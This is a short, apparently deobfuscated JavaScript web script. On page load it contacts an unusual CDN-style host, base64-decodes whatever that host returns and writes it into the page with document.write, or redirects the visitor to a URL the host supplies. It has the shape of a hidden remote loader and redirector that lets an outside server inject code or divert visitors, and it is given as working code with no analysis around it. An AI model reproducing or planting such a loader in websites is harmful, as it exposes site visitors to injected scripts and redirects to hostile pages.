//Mon Feb 10 2025 14:52:36 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const sss = getVideoid("t") ? "t=" + getVideoid("t") : "s=" + getVideoid("s");
window.onload = function () {
  fetch("//api3tgskr909-ccc2023.302yun.com.cname1339.yjs-cdn.com/wz/get.php?" + sss).then(_0x5a7c23 => _0x5a7c23.json()).then(_0xc016bf => {
    if (_0xc016bf.code == 200) {
      {
        const _0x263904 = decodeURIComponent(window.atob(_0xc016bf.data));
        document.write(_0x263904);
      }
    } else {
      window.location.href = _0xc016bf.data;
    }
  }).catch(_0xbf974f => {
    window.location.href = "/aa95e560074b73ac";
  });
};
function getVideoid(_0xef7d57) {
  (function () {})();
  var _0x2167d2 = window.location.search.substring(1),
    _0x5eb8b9 = _0x2167d2.split("&");
  for (var _0x51ba65 = 0; _0x51ba65 < _0x5eb8b9.length; _0x51ba65++) {
    {
      var _0x182438 = _0x5eb8b9[_0x51ba65].split("=");
      if (_0x182438[0] == _0xef7d57) return _0x182438[1];
    }
  }
  return false;
}